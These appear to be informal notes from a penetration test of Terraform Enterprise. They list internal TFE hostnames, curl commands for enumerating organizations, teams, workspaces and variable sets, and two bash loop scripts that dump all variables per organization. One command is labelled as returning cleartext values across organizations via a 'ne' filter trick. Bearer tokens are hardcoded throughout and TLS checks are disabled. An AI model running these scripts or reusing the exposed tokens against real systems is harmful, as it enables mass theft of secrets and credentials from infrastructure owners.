orgs TFE instances:

- global.tfe.center.com
- central.tfe.testcinternal.com
- east.tfe.test.internal.com
- west.tfe.test.cinternal.com
- stage.tfe.center.com

aleksi recommend following this guide to fix any SSL Cert issues: [https://ranxing.wordpress.com/2019/06/15/terraform-ssl-connection-behind-proxy/](https://ranxing.wordpress.com/2019/06/15/terraform-ssl-connection-behind-proxy/)

i run
```
curl -k \
  --header "Authorization: Bearer aL39C28jpIXvzlop1jZMV7zZcsbbyU
" \
  --header "Content-Type: application/vnd.api+json" \
  --request GET \
 https://central.tfe.ABCDinternal.com/api/v2/organizations/ | jq
```


List organizations

```
curl \
  --header "Authorization: Bearer $token" \
  --header "Content-Type: application/vnd.api+json" \
  --request GET \
  https://tfe.ABCD.com/api/v2/organizations/ | jq
```

List teams

```
curl \
  --header "Authorization: Bearer $token" \
  --header "Content-Type: application/vnd.api+json" \
  --request GET \
  https://tfe.ABCD.com/api/v2/organizations/$org/teams | jq
```

List all workspaces

```
curl \
  --header "Authorization: Bearer $token" \
  --header "Content-Type: application/vnd.api+json" \
   https://tfe.ABCD.com/api/v2/organizations/$org/workspaces | jq
```

List all variables in a workspace (no cleartext values)

```
curl \
  --header "Authorization: Bearer $token" \
  --header "Content-Type: application/vnd.api+json" \
https://tfe.ABCD.com/api/v2/workspaces/$workspace/vars | jq
```

List all variables for an organization (cleartext)

```
curl \
  --header "Authorization: Bearer toke" \
  --header "Content-Type: application/vnd.api+json" \
"https://tfe.ABCD.com/api/v2/vars?filter%5Borganization%5D%5Bne%5D=$ORG" | jq
```


List all variable sets for an organization

```
curl \
  --header "Authorization: Bearer token" \
  --header "Content-Type: application/vnd.api+json" \ https://west.tfe.ABCDinternal.com/api/v2/organizations/$org/varsets | jq
```

script its all out-kali

```
listallvarsfororgLooper.sh
#!/bin/bash

# Set the API endpoint
ENDPOINT="https://central.tfe.ABCDinternal.com/api/v2/vars?filter%5Borganization%5D%5Bne%5D="

# Set the input file containing the organization IDs
INPUT_FILE="organization_ids.txt"

# Convert Windows CRLF to Unix LF if necessary
dos2unix "$INPUT_FILE"

# Read the organization IDs from the input file
while ID= read -r org
do
  # Trim any trailing newline or carriage return
  org=$(echo "$org" | tr -d '\r')

  # Define the output file for each organization
  ORG_OUTPUT_FILE="AllVariables${org}.txt"

  # Print the URL being accessed for debugging
  echo "Accessing URL: $ENDPOINT=$org"

  # Make the API request and write the output to the respective file
  curl -k \
    --header "Authorization: Bearer aL39C28j3jZMV7zZcsbbyU" \
    --header "Content-Type: application/vnd.api+json" \
    --request GET \
    "$ENDPOINT=$org" | jq > "$ORG_OUTPUT_FILE"

done < "$INPUT_FILE"

```

```
Looper.sh

#!/bin/bash

# Set the API endpoint
ENDPOINT="https://east.tfe.ABCDinternal.com/api/v2/organizations"

# Set the input file containing the organization IDs
INPUT_FILE="organization_ids.txt"

# Convert Windows CRLF to Unix LF if necessary
dos2unix "$INPUT_FILE"

# Read the organization IDs from the input file
while IFS= read -r org
do
  # Trim any trailing newline or carriage return
  org=$(echo "$org" | tr -d '\r')

  # Define the output file for each organization
  ORG_OUTPUT_FILE="WorkSpace${org}.txt"

  # Print the URL being accessed for debugging
  echo "Accessing URL: $ENDPOINT/$org/workspaces"

  # Make the API request and write the output to the respective file
  curl -k \
    --header "Authorization: Bearer Ji4Ec" \
    --header "Content-Type: application/vnd.api+json" \
    --request GET \
    "$ENDPOINT/$org/workspaces" | jq > "$ORG_OUTPUT_FILE"

done < "$INPUT_FILE"

```